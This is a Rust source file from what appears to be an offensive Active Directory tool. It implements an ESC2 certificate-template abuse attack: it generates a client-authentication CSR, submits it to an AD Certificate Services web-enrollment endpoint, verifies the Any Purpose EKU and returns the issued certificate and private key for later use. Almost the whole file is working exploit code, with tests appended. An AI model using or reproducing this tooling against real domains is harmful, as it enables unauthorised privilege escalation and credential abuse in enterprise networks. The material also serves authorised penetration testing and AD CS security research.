//! ESC2 — Any Purpose EKU Certificate Template Abuse
//!
//! ESC2 exploits certificate templates that have "Any Purpose" EKU or no EKU restrictions.
//! Unlike ESC1, ESC2 doesn't require SAN abuse, but the certificate can still be used
//! for client authentication and other purposes.
//!
//! Reference: SpecterOps "Certified Pre-Owned" — ESC2

use crate::adcs::{IssuedCertificate, create_client_auth_csr};
use crate::adcs::web_enrollment::WebEnrollmentClient;
use crate::error::{OverthroneError, Result};
use tracing::info;

/// ESC2 exploiter for Any Purpose EKU templates
pub struct Esc2Exploiter {
    web_client: WebEnrollmentClient,
}

impl Esc2Exploiter {
    /// Create a new ESC2 exploiter
    pub fn new(ca_server: &str) -> Result<Self> {
        let web_client = WebEnrollmentClient::new(ca_server)?;
        Ok(Self { web_client })
    }

    /// Execute ESC2 attack
    /// 
    /// # Arguments
    /// * `template` - Template name with Any Purpose EKU
    /// * `subject_cn` - Subject Common Name for the certificate
    /// * `custom_eku` - Optional custom EKU values to request
    /// 
    /// # Returns
    /// * `Ok(IssuedCertificate)` - Successfully issued certificate
    /// * `Err(OverthroneError)` - If the attack fails
    pub async fn exploit(
        &self,
        template: &str,
        subject_cn: &str,
        _custom_eku: Option<Vec<String>>,
    ) -> Result<IssuedCertificate> {
        info!(
            "Executing ESC2 attack: template={}, subject={}",
            template, subject_cn
        );

        // Create CSR without SAN restrictions
        let (csr_der, private_key) = create_client_auth_csr(subject_cn, template, None)?;

        // Submit to CA
        let response = self
            .web_client
            .submit_request(&csr_der, template, None)
            .await?;

        if !response.is_issued() {
            return Err(OverthroneError::EscAttack {
                esc_number: 2,
                reason: response.message,
            });
        }

        let cert_data = response
            .certificate
            .ok_or_else(|| OverthroneError::Adcs("No certificate in response".to_string()))?;

        // Verify the certificate has appropriate EKU
        if let Err(e) = Self::verify_certificate_eku(&cert_data) {
            info!("Warning: Certificate EKU verification failed: {}", e);
        }

        Ok(IssuedCertificate {
            pfx_data: cert_data.clone(),
            thumbprint: Self::compute_thumbprint(&cert_data),
            serial_number: Self::extract_serial(&cert_data).unwrap_or_default(),
            valid_from: "Unknown".to_string(),
            valid_to: "Unknown".to_string(),
            template: template.to_string(),
            subject: format!("CN={}", subject_cn),
            issuer: self.web_client.base_url(),
            public_key_algorithm: "RSA".to_string(),
            signature_algorithm: "SHA256RSA".to_string(),
            private_key_pem: private_key,
        })
    }

    /// Verify certificate has Any Purpose EKU or Client Authentication
    fn verify_certificate_eku(cert_der: &[u8]) -> Result<()> {
        use x509_parser::parse_x509_certificate;

        let (_, cert) = parse_x509_certificate(cert_der)
            .map_err(|e| OverthroneError::Adcs(format!("Certificate parsing failed: {:?}", e)))?;

        // Check Extended Key Usage
        if let Ok(Some(eku)) = cert.extended_key_usage() {
            // Check for Client Authentication (1.3.6.1.5.5.7.3.2)
            let has_client_auth = eku.value.client_auth
                || eku.value.other.iter().any(|oid| {
                    oid.to_string() == "1.3.6.1.5.5.7.3.2"
                });

            // Check for Any Purpose (2.5.29.37.0)
            let has_any_purpose = eku.value.any
                || eku.value.other.iter().any(|oid| {
                    oid.to_string() == "2.5.29.37.0"
                });

            if has_client_auth || has_any_purpose {
                return Ok(());
            }

            return Err(OverthroneError::Adcs(
                "Certificate does not have Client Authentication or Any Purpose EKU".to_string(),
            ));
        }

        // No EKU extension means it can be used for any purpose
        Ok(())
    }

    fn compute_thumbprint(cert_der: &[u8]) -> String {
        use sha1::{Digest, Sha1};
        let mut hasher = Sha1::new();
        hasher.update(cert_der);
        let result = hasher.finalize();
        hex::encode(result).to_uppercase()
    }

    fn extract_serial(cert_der: &[u8]) -> Result<String> {
        use x509_parser::parse_x509_certificate;

        match parse_x509_certificate(cert_der) {
            Ok((_, cert)) => {
                let serial = cert.tbs_certificate.serial.to_bytes_be();
                Ok(hex::encode(serial).to_uppercase())
            }
            Err(_) => Ok("Unknown".to_string()),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;

    // ============================================================================
    // Unit Tests
    // ============================================================================

    #[test]
    fn test_esc2_exploiter_creation() {
        let exploiter = Esc2Exploiter::new("ca.corp.local");
        assert!(exploiter.is_ok());
    }

    #[test]
    fn test_compute_thumbprint() {
        // Test with a known certificate DER
        let cert_der = vec![0x30, 0x82, 0x01, 0x00]; // Minimal DER structure
        let thumbprint = Esc2Exploiter::compute_thumbprint(&cert_der);
        assert!(!thumbprint.is_empty());
        assert_eq!(thumbprint.len(), 40); // SHA1 hash is 40 hex chars
    }

    // ============================================================================
    // Property-Based Tests
    // ============================================================================

    // Property 16: Certificate EKU Verification
    // For any certificate DER, EKU verification should not panic
    proptest! {
        #[test]
        fn prop_certificate_eku_verification(
            cert_data in prop::collection::vec(any::<u8>(), 100..1024)
        ) {
            // This should either succeed or return an error, but not panic
            let _ = Esc2Exploiter::verify_certificate_eku(&cert_data);
        }
    }

    // Property 15: ESC2 CSR Without SAN Restrictions
    // Thumbprint computation should be deterministic
    proptest! {
        #[test]
        fn prop_thumbprint_determinism(
            cert_data in prop::collection::vec(any::<u8>(), 1..1024)
        ) {
            let thumbprint1 = Esc2Exploiter::compute_thumbprint(&cert_data);
            let thumbprint2 = Esc2Exploiter::compute_thumbprint(&cert_data);
            prop_assert_eq!(&thumbprint1, &thumbprint2);
            prop_assert_eq!(thumbprint1.len(), 40); // SHA1 hash
        }
    }
}
